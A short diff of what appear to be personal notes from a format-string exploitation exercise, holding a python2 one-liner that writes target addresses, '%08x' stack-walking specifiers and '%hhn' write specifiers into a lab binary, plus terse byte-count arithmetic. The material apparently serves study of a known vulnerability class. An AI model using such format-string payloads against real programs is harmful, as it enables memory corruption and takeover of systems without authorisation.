@@ -41,3 +41,4 @@ tmpbuffer
 				python2 -c "print '\x8c\xd6\xff\xff'+'\x8d\xd6\xff\xff' + '%08x.'*8 + '%hhhn%hhn'" | ./formatstring_formats5_3
 				8 Bytes+ 9bytes
 				=62bytes
+		4,4,4,10,58x
